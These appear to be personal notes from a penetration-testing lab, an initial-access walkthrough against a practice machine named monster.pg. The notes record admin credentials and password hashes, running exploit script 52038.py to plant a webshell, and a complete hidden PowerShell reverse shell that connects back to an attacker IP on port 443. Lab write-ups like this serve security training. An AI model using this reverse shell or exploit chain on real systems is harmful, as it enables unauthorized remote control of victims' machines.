![[Initial Access image 125.png]]

admin wazowski

![[Initial Access image 126.png]]

![[Initial Access image 127.png]]

Create Backup & Download

![[Initial Access image 128.png]]

![[Initial Access image 129.png]]

admin's password hash

![[Initial Access image 130.png]]

a2b4e80cd640aaa6e417febe095dcbfc

Mike's password hash

![[Initial Access image 131.png]]

844ffc2c7150b93c4133a6ff2e1a2dba

![[Initial Access image 132.png]]

※52038.pyには改行など多くの修正点があるため直して使う

以下は修正後のスクリプトを使用

└─$ python3 -m venv .venv

![[Initial Access image 133.png]]

└─$ .venv/bin/python3 52038.py http://monster.pg/blog admin wazowski

![[Initial Access image 134.png]]

└─$ .venv/bin/python3 52038.py http://monster.pg/blog admin wazowski

![[Initial Access image 135.png]]

http://monster.pg/blog/public/themes/default/fzovp.chunk.php

実行後Webshellが作成される

![[Initial Access image 136.png]]

ReverseShell

![[Initial Access image 137.png]]

powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('192.168.45.231', 443);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {\[byte\[\]\]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = (\[text.encoding\]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"

![[Initial Access image 138.png]]